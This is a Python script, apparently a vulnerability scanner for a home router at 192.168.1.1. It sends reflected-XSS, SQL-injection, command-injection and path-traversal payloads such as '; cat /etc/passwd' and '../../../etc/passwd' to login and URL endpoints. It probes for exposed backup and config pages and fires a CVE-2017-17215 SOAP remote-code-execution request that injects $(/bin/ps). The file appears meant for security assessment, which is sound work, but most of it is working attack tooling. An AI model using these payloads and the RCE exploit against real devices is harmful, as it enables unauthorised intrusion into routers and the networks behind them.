#!/usr/bin/env python3
"""
Router Vulnerability Scanner — Phase 1: HTTP-only tests.
Fast tests (no Selenium). Runs in under 60 seconds.
"""

import base64
import json
import ssl
import sys
import urllib.request
import urllib.error
from datetime import datetime

ROUTER = "https://192.168.1.1"
TIMEOUT = 5

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
findings = []


def safe_print(text):
    try:
        print(text)
    except UnicodeEncodeError:
        print(text.encode("ascii", errors="replace").decode())


def log(category, severity, detail):
    entry = {"category": category, "severity": severity, "detail": detail}
    findings.append(entry)
    icons = {"critical": "!!!", "high": " !!", "medium": " ! ", "low": " i "}
    safe_print(f"  [{icons.get(severity,'   ')}] [{severity.upper():8s}] [{category}] {detail}")


def fetch(path, method="GET", data=None, extra_headers=None, timeout=TIMEOUT):
    url = f"{ROUTER}{path}"
    h = dict(HEADERS)
    if extra_headers:
        h.update(extra_headers)
    req = urllib.request.Request(url, method=method, headers=h)
    if data:
        if isinstance(data, dict):
            data = "&".join(f"{k}={urllib.request.quote(str(v))}" for k, v in data.items())
        req.data = data.encode() if isinstance(data, str) else data
        if "Content-Type" not in h:
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)[:100]


def get_csrf():
    status, _, body = fetch("/asp/GetRandCount.asp", method="POST")
    if status == 200:
        return body.strip().replace("\ufeff", "")
    return None


def login_post(username, password="test"):
    csrf = get_csrf()
    if not csrf:
        return 0, {}, "no_csrf"
    pw_b64 = base64.b64encode(password.encode()).decode()
    data = f"UserName={urllib.request.quote(username)}&PassWord={pw_b64}&Language=english&x.X_HW_Token={csrf}"
    return fetch("/login.cgi", method="POST", data=data)


def main():
    safe_print(f"\n{'='*60}")
    safe_print("  Router Vulnerability Scanner (HTTP Phase)")
    safe_print(f"  Target: {ROUTER}")
    safe_print(f"  Time:   {datetime.now().isoformat()}")
    safe_print(f"{'='*60}\n")

    # ── 0. Baseline: headers from main page ──
    safe_print("[Phase 0] Response Headers Analysis...\n")
    status, headers, body = fetch("/")
    safe_print(f"  Main page status: {status}")
    for h in ["Server", "X-Powered-By", "X-Frame-Options", "X-XSS-Protection", "Content-Security-Policy"]:
        val = headers.get(h, "MISSING")
        safe_print(f"  {h}: {val}")
    if headers.get("X-Frame-Options") and "SAMEORIGIN" in headers["X-Frame-Options"]:
        log("HEADERS", "low", "X-Frame-Options: SAMEORIGIN (good)")
    if "unsafe" in headers.get("Content-Security-Policy", ""):
        log("HEADERS", "medium", f"CSP allows unsafe-inline/eval: {headers.get('Content-Security-Policy')}")
    safe_print("")

    # ── 1. Reflected XSS in URL parameters ──
    safe_print("[Phase 1] Reflected XSS in URL parameters...\n")
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",
        "${7*7}",
    ]
    xss_endpoints = [
        "/login.asp?error={p}", "/login.asp?user={p}", "/login.asp?lang={p}",
        "/login.asp?redirect={p}", "/login.asp?url={p}", "/login.asp?next={p}",
        "/login.asp?callback={p}", "/?ref={p}", "/?page={p}", "/?action={p}",
        "/?cmd={p}", "/?lang={p}", "/?error={p}", "/?msg={p}",
    ]
    xss_found = False
    for ep_t in xss_endpoints:
        for payload in xss_payloads:
            ep = ep_t.replace("{p}", urllib.request.quote(payload))
            status, _, body = fetch(ep)
            if status == 200 and payload in body:
                log("XSS", "critical", f"Reflected XSS: {ep}")
                xss_found = True
                break
        if xss_found:
            break
    if not xss_found:
        safe_print("  No reflected XSS found.\n")

    # ── 2. XSS via login form username ──
    safe_print("[Phase 2] XSS via Login Form (username field)...\n")
    xss_login = [
        '<script>document.title="XSS"</script>',
        '"><script>document.title="XSS"</script>',
        "'-alert(1)-'",
    ]
    xss_login_found = False
    for payload in xss_login:
        status, _, body = login_post(payload)
        if payload in body:
            log("XSS", "critical", f"XSS in username reflected: {payload}")
            xss_login_found = True
            break
    if not xss_login_found:
        safe_print("  No XSS via username field.\n")

    # ── 3. SQL Injection ──
    safe_print("[Phase 3] SQL Injection...\n")
    sqli_payloads = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "admin'--", "admin' #", "1' OR 1=1--",
        "' UNION SELECT NULL--", "admin' UNION SELECT NULL--",
        "') OR ('1'='1", "1' AND 1=CONVERT(int,@@version)--",
    ]
    sqli_found = False
    for payload in sqli_payloads:
        status, _, body = login_post(payload)
        body_l = body.lower()
        hits = [w for w in ["sql", "syntax", "mysql", "sqlite", "select", "union", "column", "table", "warning", "fatal", "query"] if w in body_l]
        if len(hits) >= 2:
            log("SQLI", "critical", f"SQL injection indicators {hits} with: {payload}")
            sqli_found = True
    if not sqli_found:
        safe_print("  No SQL injection indicators found.\n")

    # ── 4. Command Injection ──
    safe_print("[Phase 4] Command Injection...\n")
    cmdi_payloads = ["; ls", "| ls", "`ls`", "$(ls)", "; id", "| id", "`id`", "; cat /etc/passwd"]
    cmdi_found = False
    for payload in cmdi_payloads:
        status, _, body = login_post(f"admin{payload}")
        body_l = body.lower()
        hits = [w for w in ["root:", "uid=", "/bin/", "daemon", "ls:", "www-data"] if w in body_l]
        if hits:
            log("CMDI", "critical", f"Command injection indicators {hits} with: {payload}")
            cmdi_found = True
    if not cmdi_found:
        safe_print("  No command injection indicators found.\n")

    # ── 5. Path Traversal ──
    safe_print("[Phase 5] Path Traversal...\n")
    traversal = ["../../../etc/passwd", "..%2f..%2f..%2fetc/passwd", "....//....//....//etc/passwd"]
    t_endpoints = ["/download?file={p}", "/backup?file={p}", "/api/system/download?file={p}"]
    trav_found = False
    for ep_t in t_endpoints:
        for payload in traversal:
            ep = ep_t.replace("{p}", urllib.request.quote(payload))
            status, _, body = fetch(ep)
            if "root:" in body:
                log("TRAVERSAL", "critical", f"Path traversal: {ep}")
                trav_found = True
        if trav_found:
            break
    if not trav_found:
        safe_print("  No path traversal found.\n")

    # ── 6. Information Disclosure endpoints ──
    safe_print("[Phase 6] Information Disclosure endpoints...\n")
    info_paths = [
        "/robots.txt", "/.env", "/server-status", "/server-info",
        "/phpinfo.php", "/info.php", "/status", "/debug", "/trace",
        "/actuator", "/actuator/env", "/swagger.json", "/api-docs",
        "/userconfig_PLDT_admin.htm", "/html/ssmp/management/backup.asp",
        "/tr064", "/HNAP1/", "/HNAP1/Authenticate",
    ]
    for path in info_paths:
        status, _, body = fetch(path)
        if status in (200, 401, 403) and len(body) > 100:
            sens = ["password", "secret", "key", "token", "credential", "admin"]
            found_sens = [s for s in sens if s in body.lower()]
            if found_sens:
                log("INFO_DISC", "high", f"Sensitive data in {path}: indicators {found_sens}")
            elif status == 200:
                log("INFO_DISC", "low", f"Accessible: {path} ({len(body)} bytes)")

    # ── 7. Known CVEs ──
    safe_print("\n[Phase 7] Known CVEs...\n")
    # CVE-2017-17215 SOAP RCE
    soap = '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service=WANPPPConnection:1"><NewStatusURL>$(/bin/ps)</NewStatusURL><NewDownloadURL>$(/bin/ps)</NewDownloadURL></u:Upgrade></SOAP-ENV:Body></SOAP-ENV:Envelope>'
    status, _, body = fetch("/tr064", method="POST", data=soap, extra_headers={"Content-Type": "text/xml"})
    if status == 200 and ("PID" in body or "root" in body):
        log("CVE", "critical", "CVE-2017-17215: SOAP RCE confirmed!")
    elif status == 200:
        safe_print(f"  /tr064 responded ({status}, {len(body)} bytes)")

    # HNAP
    status, _, body = fetch("/HNAP1/")
    if status == 200:
        safe_print(f"  /HNAP1/ responded ({status}, {len(body)} bytes)")
        if "getdevicestats" in body.lower():
            log("HNAP", "medium", "HNAP endpoint accessible without auth")

    safe_print("")

    # ── 8. CSRF token analysis ──
    safe_print("[Phase 8] CSRF Token Analysis...\n")
    tokens = []
    for i in range(5):
        t = get_csrf()
        if t:
            tokens.append(t)
    if tokens:
        safe_print(f"  Token samples: {tokens[:3]}")
        if len(set(tokens)) == 1:
            safe_print(f"  WARNING: CSRF token is static! ({tokens[0]})")
            log("CSRF", "high", f"Static CSRF token: {tokens[0]}")
        else:
            safe_print(f"  CSRF token rotates ({len(set(tokens))} unique out of {len(tokens)})")
    safe_print("")

    # ── Summary ──
    safe_print(f"{'='*60}")
    safe_print("  SCAN SUMMARY")
    safe_print(f"{'='*60}\n")
    for sev in ["critical", "high", "medium", "low"]:
        items = [f for f in findings if f["severity"] == sev]
        safe_print(f"  {sev.upper():10s}: {len(items)}")
        for f in items:
            safe_print(f"    - [{f['category']}] {f['detail']}")
    safe_print("")

    with open("vuln_report.json", "w", encoding="utf-8") as f:
        json.dump({"router": ROUTER, "time": datetime.now().isoformat(), "findings": findings}, f, indent=2, ensure_ascii=False)
    safe_print("  Report saved to vuln_report.json\n")


if __name__ == "__main__":
    main()
